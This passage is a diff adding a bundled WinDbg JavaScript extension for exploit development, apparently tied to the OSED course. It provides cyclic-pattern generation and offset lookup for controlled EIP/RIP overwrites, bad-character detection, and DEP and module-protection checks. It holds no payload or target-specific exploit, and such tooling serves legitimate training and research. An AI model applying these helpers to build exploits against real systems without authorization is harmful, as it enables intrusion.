@@ -1,0 +1,21287 @@
+// Legacy runtime for WinDbg JsProvider builds without BigInt (classic WinDbg 10.0.19041).
+// Bigint values are represented as integral Numbers. Any value outside the
+// safe-integer range throws instead of silently losing precision.
+var __bi = (function () {
+  var TWO32 = 4294967296;
+
+  function check(value, what) {
+    if (!Number.isSafeInteger(value)) {
+      throw new RangeError("osed legacy build: " + what + " is outside the 53-bit safe range (" + value + ")");
+    }
+    return value;
+  }
+
+  function parse(text) {
+    var s = String(text).trim();
+    if (s === "") return 0;
+    if (/^[+-]?\d+$/.test(s)) return check(Number(s), "BigInt(\"" + s + "\")");
+    var m = /^0([xob])([0-9a-f]+)$/i.exec(s);
+    if (m) {
+      var radix = { x: 16, o: 8, b: 2 }[m[1].toLowerCase()];
+      var digits = m[2];
+      var valid = radix === 16 ? /^[0-9a-f]+$/i : radix === 8 ? /^[0-7]+$/ : /^[01]+$/;
+      if (valid.test(digits)) return check(parseInt(digits, radix), "BigInt(\"" + s + "\")");
+    }
+    throw new SyntaxError("Cannot convert " + s + " to a BigInt");
+  }
+
+  function toBig(value) {
+    switch (typeof value) {
+      case "number":
+        if (!Number.isInteger(value)) throw new RangeError("The number " + value + " cannot be converted to a BigInt because it is not an integer");
+        return check(value, "BigInt(" + value + ")");
+      case "string":
+        return parse(value);
+      case "boolean":
+        return value ? 1 : 0;
+      case "bigint":
+        return check(Number(value), "BigInt(" + value + ")");
+      case "object":
+      case "function":
+        if (value !== null) {
+          var primitive = value.valueOf();
+          if (primitive !== value && (typeof primitive !== "object" || primitive === null)) return toBig(primitive);
+          return parse(String(value));
+        }
+    }
+    throw new TypeError("Cannot convert " + value + " to a BigInt");
+  }
+
+  function split(v) {
+    var hi = Math.floor(v / TWO32);
+    return { hi: hi, lo: v - hi * TWO32 };
+  }
+
+  function join(hi, lo) {
+    return check(hi * TWO32 + (lo >>> 0), "bitwise result");
+  }
+
+  toBig.and = function (a, b) {
+    var x = split(a), y = split(b);
+    return join(x.hi & y.hi, x.lo & y.lo);
+  };
+  toBig.or = function (a, b) {
+    var x = split(a), y = split(b);
+    return join(x.hi | y.hi, x.lo | y.lo);
+  };
+  toBig.xor = function (a, b) {
+    var x = split(a), y = split(b);
+    return join(x.hi ^ y.hi, x.lo ^ y.lo);
+  };
+  toBig.shl = function (a, n) {
+    if (n < 0) return toBig.shr(a, -n);
+    return check(a * Math.pow(2, n), "left shift");
+  };
+  toBig.shr = function (a, n) {
+    if (n < 0) return toBig.shl(a, -n);
+    return Math.floor(a / Math.pow(2, n));
+  };
+  toBig.mul = function (a, b) {
+    return check(a * b, "multiplication");
+  };
+  toBig.div = function (a, b) {
+    if (b === 0) throw new RangeError("Division by zero");
+    var q = Math.trunc(a / b);
+    var r = a - q * b;
+    var step = (a < 0) === (b < 0) ? 1 : -1;
+    if (r !== 0 && (r < 0) !== (a < 0)) q -= step;
+    else if (Math.abs(r) >= Math.abs(b)) q += step;
+    return q === 0 ? 0 : q;
+  };
+  toBig.asUintN = function (bits, v) {
+    if (bits > 53) {
+      if (v < 0) throw new RangeError("osed legacy build: asUintN(" + bits + ") of a negative value is outside the 53-bit safe range");
+      return v;
+    }
+    var mod = Math.pow(2, bits);
+    var r = v % mod;
+    return r < 0 ? r + mod : r === 0 ? 0 : r;
+  };
+  toBig.asIntN = function (bits, v) {
+    if (bits > 53) return v;
+    var mod = Math.pow(2, bits);
+    var r = toBig.asUintN(bits, v);
+    return r >= mod / 2 ? r - mod : r;
+  };
+  return toBig;
+})();
+
+// Old Chakra sorts unstably; ES2019 engines keep ties in input order, which rankings rely on.
+(function () {
+  var nativeSort = Array.prototype.sort;
+  Object.defineProperty(Array.prototype, "sort", {
+    configurable: true,
+    writable: true,
+    value: function sort(compare) {
+      if (typeof compare !== "function") return nativeSort.call(this, compare);
+      var decorated = [], undefinedCount = 0, length = this.length >>> 0, i;
+      for (i = 0; i < length; i++) {
+        if (!(i in this)) continue;
+        if (this[i] === undefined) undefinedCount++;
+        else decorated.push({ value: this[i], index: i });
+      }
+      nativeSort.call(decorated, function (a, b) {
+        return compare(a.value, b.value) || a.index - b.index;
+      });
+      var at = 0;
+      for (i = 0; i < decorated.length; i++) this[at++] = decorated[i].value;
+      for (i = 0; i < undefinedCount; i++) this[at++] = undefined;
+      while (at < length) delete this[at++];
+      return this;
+    },
+  });
+})();
+
+if (!Array.prototype.flat) {
+  Object.defineProperty(Array.prototype, "flat", {
+    configurable: true,
+    writable: true,
+    value: function flat(depth) {
+      var d = depth === undefined ? 1 : Number(depth);
+      var out = [];
+      (function walk(arr, level) {
+        for (var i = 0; i < arr.length; i++) {
+          if (!(i in arr)) continue;
+          if (Array.isArray(arr[i]) && level > 0) walk(arr[i], level - 1);
+          else out.push(arr[i]);
+        }
+      })(this, d);
+      return out;
+    },
+  });
+}
+if (!Array.prototype.flatMap) {
+  Object.defineProperty(Array.prototype, "flatMap", {
+    configurable: true,
+    writable: true,
+    value: function flatMap(fn, thisArg) {
+      return Array.prototype.map.call(this, fn, thisArg).flat(1);
+    },
+  });
+}
+if (!Object.fromEntries) {
+  Object.fromEntries = function fromEntries(entries) {
+    var out = {};
+    for (var pair of entries) out[pair[0]] = pair[1];
+    return out;
+  };
+}
+if (!String.prototype.trimEnd) {
+  String.prototype.trimEnd = String.prototype.trimRight || function () { return String(this).replace(/\s+$/, ""); };
+}
+if (!String.prototype.trimStart) {
+  String.prototype.trimStart = String.prototype.trimLeft || function () { return String(this).replace(/^\s+/, ""); };
+}
+
+"use strict";
+var osed_bundle = (() => {
+  var __defProp = Object.defineProperty;
+  var __defProps = Object.defineProperties;
+  var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
+  var __getOwnPropDescs = Object.getOwnPropertyDescriptors;
+  var __getOwnPropNames = Object.getOwnPropertyNames;
+  var __getOwnPropSymbols = Object.getOwnPropertySymbols;
+  var __hasOwnProp = Object.prototype.hasOwnProperty;
+  var __propIsEnum = Object.prototype.propertyIsEnumerable;
+  var __defNormalProp = (obj, key2, value) => key2 in obj ? __defProp(obj, key2, { enumerable: true, configurable: true, writable: true, value }) : obj[key2] = value;
+  var __spreadValues = (a, b) => {
+    for (var prop in b || (b = {}))
+      if (__hasOwnProp.call(b, prop))
+        __defNormalProp(a, prop, b[prop]);
+    if (__getOwnPropSymbols)
+      for (var prop of __getOwnPropSymbols(b)) {
+        if (__propIsEnum.call(b, prop))
+          __defNormalProp(a, prop, b[prop]);
+      }
+    return a;
+  };
+  var __spreadProps = (a, b) => __defProps(a, __getOwnPropDescs(b));
+  var __objRest = (source, exclude) => {
+    var target = {};
+    for (var prop in source)
+      if (__hasOwnProp.call(source, prop) && exclude.indexOf(prop) < 0)
+        target[prop] = source[prop];
+    if (source != null && __getOwnPropSymbols)
+      for (var prop of __getOwnPropSymbols(source)) {
+        if (exclude.indexOf(prop) < 0 && __propIsEnum.call(source, prop))
+          target[prop] = source[prop];
+      }
+    return target;
+  };
+  var __export = (target, all) => {
+    for (var name in all)
+      __defProp(target, name, { get: all[name], enumerable: true });
+  };
+  var __copyProps = (to, from, except, desc) => {
+    if (from && typeof from === "object" || typeof from === "function") {
+      for (let key2 of __getOwnPropNames(from))
+        if (!__hasOwnProp.call(to, key2) && key2 !== except)
+          __defProp(to, key2, { get: () => from[key2], enumerable: !(desc = __getOwnPropDesc(from, key2)) || desc.enumerable });
+    }
+    return to;
+  };
+  var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
+
+  // src/index.ts
+  var index_exports = {};
+  __export(index_exports, {
+    initializeScript: () => initializeScript,
+    normalizeInvocation: () => normalizeInvocation
+  });
+
+  // src/core/validation.ts
+  function kindOf(value) {
+    if (Array.isArray(value)) {
+      return "array";
+    }
+    if (value === null) {
+      return "object";
+    }
+    return typeof value;
+  }
+  function validateOptions(options, schema) {
+    const errors = [];
+    const warnings = [];
+    if (typeof options !== "object" || options === null || Array.isArray(options)) {
+      return {
+        success: false,
+        errors: [{ path: "$", message: "Options must be an object." }],
+        warnings
+      };
+    }
+    const input = options;
+    const normalized = {};
+    for (const key2 of Object.keys(input)) {
+      if (!(key2 in schema)) {
+        errors.push({ path: key2, message: "Unknown option key." });
+      }
+    }
+    for (const [key2, rules] of Object.entries(schema)) {
+      const value = input[key2];
+      if (value === void 0) {
+        if (rules.default !== void 0) {
+          normalized[key2] = rules.default;
+        } else if (rules.required) {
+          errors.push({ path: key2, message: "Missing required option." });
+        }
+        continue;
+      }
+      const expectedTypes = Array.isArray(rules.type) ? rules.type : [rules.type];
+      const actual = kindOf(value);
+      if (!expectedTypes.includes(actual)) {
+        errors.push({ path: key2, message: `Expected ${expectedTypes.join(" | ")}.` });
+        continue;
+      }
+      if (rules.enum && typeof value === "string" && !rules.enum.includes(value)) {
+        errors.push({ path: key2, message: `Expected one of: ${rules.enum.join(", ")}.` });
+        continue;
+      }
+      if (typeof value === "number") {
+        if (!Number.isFinite(value) || !Number.isInteger(value)) {
+          errors.push({ path: key2, message: "Expected finite integer." });
+          continue;
+        }
+        if (rules.min !== void 0 && value < rules.min) {
+          errors.push({ path: key2, message: `Must be >= ${rules.min}.` });
+          continue;
+        }
+        if (rules.max !== void 0 && value > rules.max) {
+          normalized[key2] = rules.max;
+          warnings.push(`${key2} clamped to ${rules.max}.`);
+          continue;
+        }
+      }
+      if (Array.isArray(value) && rules.elementType) {
+        const invalid = value.find((entry) => typeof entry !== rules.elementType);
+        if (invalid !== void 0) {
+          errors.push({ path: key2, message: `Array entries must be ${rules.elementType}.` });
+          continue;
+        }
+      }
+      normalized[key2] = value;
+    }
+    if (errors.length > 0) {
+      return { success: false, errors, warnings };
+    }
+    return {
+      success: true,
+      value: normalized,
+      errors: [],
+      warnings
+    };
+  }
+  function normalizeAddress(value) {
+    if (typeof value === "number") {
+      if (!Number.isFinite(value) || !Number.isInteger(value) || value < 0) {
+        throw new Error("Address number must be a non-negative integer.");
+      }
+      return __bi(value);
+    }
+    if (typeof value === "string") {
+      const trimmed = value.trim();
+      if (!/^0x[0-9a-fA-F]+$/.test(trimmed) && !/^[0-9a-fA-F]+$/.test(trimmed)) {
+        throw new Error("Address strings must be hex only (e.g. 0x625011AF).");
+      }
+      if (/^[0-9]+$/.test(trimmed)) {
+        throw new Error("Decimal address strings are not allowed.");
+      }
+      const hex4 = trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`;
+      return __bi(hex4);
+    }
+    throw new Error("Address must be a number or hex string.");
+  }
+  function normalizeByteArray(values) {
+    const invalid = values.find((value) => !Number.isInteger(value) || value < 0 || value > 255);
+    if (invalid !== void 0) {
+      throw new Error("Byte arrays must contain integers in range 0x00..0xFF.");
+    }
+    const sorted = [...values].sort((a, b) => a - b);
+    const unique2 = [];
+    for (const value of sorted) {
+      if (unique2.length === 0 || unique2[unique2.length - 1] !== value) {
+        unique2.push(value);
+      }
+    }
+    if (unique2.length !== values.length) {
+      return {
+        values: unique2,
+        warning: "Duplicate exclude bytes were removed during normalization."
+      };
+    }
+    return { values: unique2 };
+  }
+
+  // src/core/registry.ts
+  var CommandRegistry = class {
+    constructor() {
+      this.commands = /* @__PURE__ */ new Map();
+    }
+    register(command2) {
+      if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(command2.name)) {
+        throw new Error(`Invalid command name '${command2.name}'.`);
+      }
+      this.commands.set(command2.name, command2);
+    }
+    getAll() {
+      return [...this.commands.values()].sort((a, b) => a.name.localeCompare(b.name));
+    }
+    get(name) {
+      return this.commands.get(name);
+    }
+    clear() {
+      this.commands.clear();
+    }
+    setReloader(reloader) {
+      this.reloader = reloader;
+    }
+    reload() {
+      if (!this.reloader) {
+        return this.failure("reload", {}, "Reload hook is not configured.");
+      }
+      this.clear();
+      this.reloader();
+      return {
+        command: "reload",
+        args: {},
+        success: true,
+        findings: [{ commandCount: this.getAll().length }],
+        warnings: [],
+        errors: []
+      };
+    }
+    execute(name, options) {
+      const command2 = this.commands.get(name);
+      if (!command2) {
+        return this.failure(name, {}, `Unknown command '${name}'.`);
+      }
+      const checked = validateOptions(options != null ? options : {}, command2.schema);
+      if (!checked.success || !checked.value) {
+        const errors = checked.errors.map((issue) => `${issue.path}: ${issue.message}`);
+        return {
+          command: name,
+          args: {},
+          success: false,
+          findings: [],
+          warnings: checked.warnings,
+          errors,
+          schema: command2.schema
+        };
+      }
+      try {
+        const result3 = command2.execute(checked.value);
+        result3.warnings = [...checked.warnings, ...result3.warnings];
+        return result3;
+      } catch (caught) {
+        const message = caught instanceof Error ? caught.message : String(caught);
+        return this.failure(name, checked.value, message);
+      }
+    }
+    failure(name, args, message) {
+      return {
+        command: name,
+        args,
+        success: false,
+        findings: [],
+        warnings: [],
+        errors: [message]
+      };
+    }
+  };
+
+  // src/core/output.ts
+  function write(line = "") {
+    host.diagnostics.debugLog(`${line}
+`);
+  }
+  function pad(value, width) {
+    return value.length >= width ? value : `${value}${" ".repeat(width - value.length)}`;
+  }
+  function stripDml(value) {
+    return value.replace(/<link\b[^>]*>(.*?)<\/link>/gi, "$1").replace(/&lt;/gi, "<").replace(/&gt;/gi, ">").replace(/&quot;/gi, '"').replace(/&amp;/gi, "&");
+  }
+  function visibleLength(value) {
+    return stripDml(value).length;
+  }
+  function print(message) {
+    write(message);
+  }
+  function section(title) {
+    write();
+    write(`=== ${title} ===`);
+  }
+  function info(message) {
+    write(`[+] ${message}`);
+  }
+  function warn(message) {
+    write(`[!] ${message}`);
+  }
+  function error(message) {
+    write(`[-] ${message}`);
+  }
+  function whyItMatters(line) {
+    write(`Why this matters for exploitation: ${line}`);
+  }
+  function formatAddress(address, pointerSize) {
+    const width = pointerSize === 8 ? 16 : 8;
+    return `0x${address.toString(16).toUpperCase().padStart(width, "0")}`;
+  }
+  function formatHexByte(byte) {
+    return `0x${(byte & 255).toString(16).toUpperCase().padStart(2, "0")}`;
+  }
+  function table(columns, rows) {
+    const hasVisibleValues = rows.some((row) => columns.some((column) => {
+      const value = row[column.key];
+      return value !== void 0 && value !== "";
+    }));
+    if (rows.length === 0 || !hasVisibleValues) {
+      return;
+    }
+    const widths = columns.map((column) => {
+      var _a;
+      const maxValueWidth = rows.reduce((max, row) => {
+        var _a2;
+        const value = (_a2 = row[column.key]) != null ? _a2 : "";
+        return Math.max(max, visibleLength(value));
+      }, 0);
+      return Math.max((_a = column.width) != null ? _a : 0, column.header.length, maxValueWidth);
+    });
+    const render = (values) => values.map((value, i) => pad(stripDml(value), widths[i])).join("  ");
+    write(render(columns.map((column) => column.header)));
+    write(render(widths.map((width) => "-".repeat(width))));
+    for (const row of rows) {
+      write(render(columns.map((column) => {
+        var _a;
+        return (_a = row[column.key]) != null ? _a : "";
+      })));
+    }
+  }
+
+  // src/logic/pattern_logic.ts
+  var UPPER = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  var LOWER = "abcdefghijklmnopqrstuvwxyz";
+  var DIGITS = "0123456789";
+  var MSF_MAX_LENGTH = 20280;
+  function generateMsfPattern(length) {
+    const chunks = [];
+    for (const a of UPPER) {
+      for (const b of LOWER) {
+        for (const c of DIGITS) {
+          chunks.push(`${a}${b}${c}`);
+        }
+      }
+    }
+    return chunks.join("").slice(0, length);
+  }
+  function deBruijn(alphabet, order) {
+    const k = alphabet.length;
+    const a = new Array(k * order).fill(0);
+    const result3 = [];
+    function db(t, p) {
+      if (t > order) {
+        if (order % p === 0) {
+          for (let i = 1; i <= p; i += 1) {
+            result3.push(a[i]);
+          }
+        }
+        return;
+      }
+      a[t] = a[t - p];
+      db(t + 1, p);
+      for (let j = a[t - p] + 1; j < k; j += 1) {
+        a[t] = j;
+        db(t + 1, t);
+      }
+    }
+    db(1, 1);
+    return result3.map((index) => alphabet[index]).join("");
+  }
+  function generateCyclicPattern(length) {
+    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    const sequence = deBruijn(alphabet, 3);
+    if (length > sequence.length) {
+      throw new Error(`Cyclic pattern length ${length} exceeds the maximum unique-window length ${sequence.length}. Use a smaller length or the "msf" pattern type.`);
+    }
+    return sequence.slice(0, length);
+  }
+  function decodeOffsetNeedle(value) {
+    if (typeof value === "number") {
+      if (!Number.isInteger(value) || value < 0 || value > 4294967295) {
+        throw new Error("Numeric pattern_offset value must be a 32-bit unsigned integer.");
+      }
+      const bytes = [
+        value & 255,
+        value >>> 8 & 255,
+        value >>> 16 & 255,
+        value >>> 24 & 255
+      ];
+      return String.fromCharCode(...bytes);
+    }
+    if (!/^(0x)?[0-9a-fA-F]+$/.test(value)) {
+      throw new Error("String pattern_offset value must be raw hex only.");
+    }
+    const hex4 = value.startsWith("0x") ? value.slice(2) : value;
+    if (hex4.length % 2 !== 0) {
+      throw new Error("Hex string length must be even.");
+    }
+    const chars = [];
+    for (let i = 0; i < hex4.length; i += 2) {
+      chars.push(parseInt(hex4.slice(i, i + 2), 16));
+    }
+    return String.fromCharCode(...chars.reverse());
+  }
+
+  // src/commands/pattern.ts
+  function success(command2, args, findings) {
+    return { command: command2, args, success: true, findings, warnings: [], errors: [] };
+  }
+  function createPatternCommands() {
+    const patternCreate = {
+      name: "pattern_create",
+      description: "Generate cyclic pattern strings.",
+      usage: "dx @$osed().pattern_create(length, type?)",
+      examples: [
+        'dx @$osed().pattern_create(300, "msf")',
+        'dx @$osed().pattern_create(800, "cyclic")'
+      ],
+      schema: {
+        length: { type: "number", required: true, min: 1, max: 1e5 },
+        type: { type: "string", enum: ["msf", "cyclic"], default: "msf" }
+      },
+      execute(options) {
+        const length = options.length;
+        const type = options.type;
+        if (type === "msf" && length > MSF_MAX_LENGTH) {
+          throw new Error(`MSF pattern max length is ${MSF_MAX_LENGTH}.`);
+        }
+        const pattern = type === "msf" ? generateMsfPattern(length) : generateCyclicPattern(length);
+        section("Pattern Create");
+        info(`Format: ${type}`);
+        info(`Length: ${length}`);
+        print(pattern);
+        whyItMatters("Reliable offset discovery is the foundation of controlled EIP/RIP overwrite.");
+        return success("pattern_create", options, [{ type, length, pattern }]);
+      }
+    };
+    const patternOffset = {
+      name: "pattern_offset",
+      description: "Locate value offset inside a generated pattern.",
+      usage: "dx @$osed().pattern_offset(value, type?)",
+      examples: [
+        'dx @$osed().pattern_offset(0x39654138, "msf")',
+        'dx @$osed().pattern_offset("41326341", "cyclic")'
+      ],
+      schema: {
+        value: { type: ["number", "string"], required: true },
+        type: { type: "string", enum: ["msf", "cyclic"], default: "msf" }
+      },
+      execute(options) {
+        const raw = options.value;
+        if (typeof raw !== "number" && typeof raw !== "string") {
+          throw new Error("pattern_offset.value must be number or hex string.");
+        }
+        const needle = decodeOffsetNeedle(raw);
+        const type = options.type;
+        const pattern = type === "msf" ? generateMsfPattern(MSF_MAX_LENGTH) : generateCyclicPattern(1e5);
+        const offset = pattern.indexOf(needle);
+        section("Pattern Offset");
+        info(`Format: ${type}`);
+        info(`Needle: ${needle}`);
+        if (offset < 0) {
+          error("Needle not found in selected pattern.");
+        } else {
+          info(`Offset: ${offset}`);
+        }
+        whyItMatters("Exact offset maps crash control to payload layout and exploit reliability.");
+        return success("pattern_offset", options, [{ needle, offset }]);
+      }
+    };
+    return [patternCreate, patternOffset];
+  }
+
+  // src/core/memory.ts
+  function readMemory(address, length) {
+    const attempts = [address];
+    if (address >= __bi(0) && address <= __bi(Number.MAX_SAFE_INTEGER)) {
+      attempts.push(Number(address));
+    }
+    let lastError;
+    for (const attempt of attempts) {
+      try {
+        const values = host.memory.readMemoryValues(attempt, length, 1, false);
+        return Uint8Array.from(values.map((value) => value & 255));
+      } catch (error2) {
+        lastError = error2;
+      }
+    }
+    const suffix = lastError instanceof Error && lastError.message ? ` (${lastError.message})` : "";
+    throw new Error(`Memory read failed at ${formatAddress(address, getPointerSize())}${suffix}.`);
+  }
+  function tryReadMemory(address, length) {
+    try {
+      return readMemory(address, length);
+    } catch (_error) {
+      return void 0;
+    }
+  }
+  function readUint16LE(address) {
+    const bytes = readMemory(address, 2);
+    return bytes[0] | bytes[1] << 8;
+  }
+  function readUint32LE(address) {
+    const bytes = readMemory(address, 4);
+    return (bytes[0] | bytes[1] << 8 | bytes[2] << 16 | bytes[3] << 24) >>> 0;
+  }
+  function readUint64LE(address) {
+    const bytes = readMemory(address, 8);
+    let result3 = __bi(0);
+    for (let i = 0; i < 8; i += 1) {
+      result3 = __bi.or(result3, __bi.shl(__bi(bytes[i]), __bi(i * 8)));
+    }
+    return result3;
+  }
+  function readPointer(address, pointerSize) {
+    return pointerSize === 8 ? readUint64LE(address) : __bi(readUint32LE(address));
+  }
+  function executeDebuggerCommand(command2) {
+    var _a, _b, _c, _d, _e, _f, _g;
+    const hostAny = host;
+    const exec = (_d = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.Utility) == null ? void 0 : _c.Control) == null ? void 0 : _d.ExecuteCommand;
+    if (typeof exec !== "function") {
+      throw new Error("WinDbg command execution is unavailable in this host.");
+    }
+    const control = (_g = (_f = (_e = hostAny.namespace) == null ? void 0 : _e.Debugger) == null ? void 0 : _f.Utility) == null ? void 0 : _g.Control;
+    const result3 = exec.call(control, command2);
+    if (Array.isArray(result3)) {
+      return result3.map((line) => String(line));
+    }
+    if (result3 && typeof result3[Symbol.iterator] === "function") {
+      try {
+        return Array.from(result3).map((line) => String(line));
+      } catch (_error) {
+        return [];
+      }
+    }
+    return [];
+  }
+  function parseProtectFromVprot(lines) {
+    for (const line of lines) {
+      const match = line.match(/^\s*Protect:\s+([0-9a-f`]+)\s+/i);
+      if (match) {
+        return Number(__bi.and(__bi(`0x${match[1].replace(/`/g, "")}`), __bi(4294967295)));
+      }
+    }
+    return void 0;
+  }
+  function decodeProtectValue(value) {
+    const protect = value & 255;
+    switch (protect) {
+      case 1:
+        return { name: "PAGE_NOACCESS", executable: false, writable: false };
+      case 2:
+        return { name: "PAGE_READONLY", executable: false, writable: false };
+      case 4:
+        return { name: "PAGE_READWRITE", executable: false, writable: true };
+      case 8:
+        return { name: "PAGE_WRITECOPY", executable: false, writable: true };
+      case 16:
+        return { name: "PAGE_EXECUTE", executable: true, writable: false };
+      case 32:
+        return { name: "PAGE_EXECUTE_READ", executable: true, writable: false };
+      case 64:
+        return { name: "PAGE_EXECUTE_READWRITE", executable: true, writable: true };
+      case 128:
+        return { name: "PAGE_EXECUTE_WRITECOPY", executable: true, writable: true };
+      default:
+        return { name: `0x${protect.toString(16).toUpperCase().padStart(2, "0")}`, executable: false, writable: false };
+    }
+  }
+  function queryStackProtection(sp, pointerSize) {
+    try {
+      const output = executeDebuggerCommand(`!vprot ${formatAddress(sp, pointerSize)}`);
+      const protect = parseProtectFromVprot(output);
+      if (protect === void 0)
+        return void 0;
+      const decoded = decodeProtectValue(protect);
+      return __spreadProps(__spreadValues({
+        protect
+      }, decoded), {
+        depEnforced: !decoded.executable
+      });
+    } catch (_error) {
+      return void 0;
+    }
+  }
+  function getPointerSize() {
+    var _a;
+    const process = host.currentProcess;
+    const machine = ((_a = process == null ? void 0 : process.Machine) != null ? _a : "").toLowerCase();
+    if ((process == null ? void 0 : process.Is64Bit) || machine.includes("x64") || machine.includes("amd64")) {
+      return 8;
+    }
+    return 4;
+  }
+
+  // src/logic/badchars_logic.ts
+  function expectedBytes(exclude) {
+    const excluded = new Set(exclude.map((value) => value & 255));
+    const result3 = [];
+    for (let i = 0; i <= 255; i += 1) {
+      if (!excluded.has(i)) {
+        result3.push(i);
+      }
+    }
+    return result3;
+  }
+  function hexByte(value) {
+    return (value & 255).toString(16).padStart(2, "0");
+  }
+  function formatByteArray(bytes, format) {
+    switch (format) {
+      case "python":
+        return `b"${bytes.map((value) => `\\x${hexByte(value)}`).join("")}"`;
+      case "c":
+        return `"${bytes.map((value) => `\\x${hexByte(value)}`).join("")}"`;
+      case "hex":
+      default:
+        return bytes.map(hexByte).join(" ");
+    }
+  }
+  function pythonBadcharsLine(badchars) {
+    const sorted = [...new Set(badchars.map((value) => value & 255))].sort((a, b) => a - b);
+    return `BADCHARS = ${formatByteArray(sorted, "python")}`;
+  }
+  function nextBadcharCommand(command2, addressArg, badchars) {
+    const sorted = [...new Set(badchars.map((value) => value & 255))].sort((a, b) => a - b);
+    return `dx @$osed().${command2}(${addressArg}, "${sorted.map((value) => hexByte(value).toUpperCase()).join(" ")}")`;
+  }
+  function pythonBadcharHelper(badchars) {
+    return [
+      `${pythonBadcharsLine(badchars)}  # add each new bad char here`,
+      "",
+      "def badchar_array(bad=BADCHARS):",
+      "    return bytes(b for b in range(256) if b not in bad)"
+    ];
+  }
+  function locateExpectedArray(window, expected, minRun = 8) {
+    const expectedIndex = /* @__PURE__ */ new Map();
+    for (let i = 0; i < expected.length; i += 1) {
+      expectedIndex.set(expected[i], i);
+    }
+    for (let start = 0; start < window.length; start += 1) {
+      const ei = expectedIndex.get(window[start]);
+      if (ei === void 0)
+        continue;
+      let run = 0;
+      for (let i = 0; start + i < window.length && ei + i < expected.length; i += 1) {
+        if (window[start + i] !== expected[ei + i])
+          break;
+        run += 1;
+      }
+      if (run >= minRun) {
+        return { offset: start, expectedStart: ei, matchedRun: run };
+      }
+    }
+    for (let start = 0; start < window.length; start += 1) {
+      const ei = expectedIndex.get(window[start]);
+      if (ei === void 0)
+        continue;
+      let e = ei;
+      let o = start;
+      let matched = 0;
+      while (e < expected.length && o < window.length) {
+        if (window[o] === expected[e]) {
+          matched += 1;
+          e += 1;
+          o += 1;
+        } else if (expected[e] < window[o]) {
+          e += 1;
+        } else {
+          break;
+        }
+      }
+      if (matched >= minRun) {
+        return { offset: start, expectedStart: ei, matchedRun: matched };
+      }
+    }
+    return void 0;
+  }
+  function findReturnSlot(before, ip, pointerSize) {
+    const needle = [];
+    let rest = ip;
+    for (let i = 0; i < pointerSize; i += 1) {
+      needle.push(Number(__bi.and(rest, __bi(255))));
+      rest = __bi.shr(rest, __bi(8));
+    }
+    for (let offset = before.length - pointerSize; offset >= 0; offset -= 1) {
+      let match = true;
+      for (let i = 0; i < pointerSize && match; i += 1) {
+        match = before[offset + i] === needle[i];
+      }
+      if (match)
+        return offset;
+    }
+    return void 0;
+  }
+  var EXPANSION_SLACK = 32;
+  function compareBadchars(observed, expected, leadingSlack = 0) {
+    var _a;
+    const n = expected.length;
+    const m = Math.min(observed.length, n + EXPANSION_SLACK);
+    const width = m + 1;
+    const cost = new Uint32Array((n + 1) * width);
+    for (let j2 = 0; j2 <= m; j2 += 1)
+      cost[j2] = Math.max(0, j2 - leadingSlack);
+    for (let i2 = 1; i2 <= n; i2 += 1) {
+      cost[i2 * width] = i2;
+      for (let j2 = 1; j2 <= m; j2 += 1) {
+        const pair = cost[(i2 - 1) * width + j2 - 1] + (expected[i2 - 1] === observed[j2 - 1] ? 0 : 1);
+        const dropped = cost[(i2 - 1) * width + j2] + 1;
+        const extra = cost[i2 * width + j2 - 1] + 1;
+        cost[i2 * width + j2] = Math.min(pair, dropped, extra);
+      }
+    }
+    let end = 0;
+    for (let j2 = 1; j2 <= m; j2 += 1) {
+      if (cost[n * width + j2] < cost[n * width + end])
+        end = j2;
+    }
+    const fate = new Array(n);
+    const seen = new Array(n).fill(-1);
+    const extras = [];
+    let i = n;
+    let j = end;
+    while (i > 0 || j > leadingSlack) {
+      const here = cost[i * width + j];
+      if (i > 0 && j > 0 && expected[i - 1] === observed[j - 1] && here === cost[(i - 1) * width + j - 1]) {
+        fate[i - 1] = "kept";
+        seen[i - 1] = observed[j - 1];
+        i -= 1;
+        j -= 1;
+      } else if (i > 0 && j > 0 && here === cost[(i - 1) * width + j - 1] + 1) {
+        fate[i - 1] = "changed";
+        seen[i - 1] = observed[j - 1];
+        i -= 1;
+        j -= 1;
+      } else if (i > 0 && here === cost[(i - 1) * width + j] + 1) {
+        fate[i - 1] = "dropped";
+        i -= 1;
+      } else {
+        extras.push({ gap: i, value: observed[j - 1] });
+        j -= 1;
+      }
+    }
+    let tested = 0;
+    let score = 0;
+    let best = 0;
+    for (let k = 0; k < n; k += 1) {
+      score += fate[k] === "kept" ? 1 : -1;
+      if (fate[k] === "kept" && score > 0 && score >= best) {
+        best = score;
+        tested = k + 1;
+      }
+    }
+    const truncated = n - tested >= 2;
+    if (!truncated)
+      tested = n;
+    const expanded = /* @__PURE__ */ new Map();
+    for (const { gap, value } of extras) {
+      const before = gap - 1;
+      const owner = before >= 0 && (fate[before] !== "kept" || gap >= n) ? before : gap;
+      if (owner < tested && !expanded.has(owner))
+        expanded.set(owner, value);
+    }
+    const badChars = [];
+    const mismatches = [];
+    let survivorCount = 0;
+    for (let k = 0; k < tested; k += 1) {
+      if (fate[k] === "kept" && !expanded.has(k)) {
+        survivorCount += 1;
+        continue;
+      }
+      badChars.push(expected[k]);
+      const value = fate[k] === "dropped" ? -1 : fate[k] === "kept" ? (_a = expanded.get(k)) != null ? _a : -1 : seen[k];
+      mismatches.push({ offset: k, expected: expected[k], observed: value });
+    }
+    return __spreadValues({
+      badChars,
+      mismatches,
+      survivorCount,
+      expectedConsumed: tested,
+      startOffset: j
+    }, truncated ? { truncatedAt: expected[tested] } : {});
+  }
+
+  // src/commands/modules.ts
+  var IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 64;
+  var IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 256;
+  function parseBigIntString(value) {
+    const text = value.trim();
+    if (/^0x[0-9a-fA-F]+$/.test(text)) {
+      return __bi(text);
+    }
+    if (/^[0-9a-fA-F]+$/.test(text)) {
+      return __bi(`0x${text}`);
+    }
+    if (/^[0-9]+$/.test(text)) {
+      return __bi(text);
+    }
+    return __bi(0);
+  }
+  function toBigInt(value) {
+    if (typeof value === "bigint") {
+      return value;
+    }
+    if (typeof value === "number") {
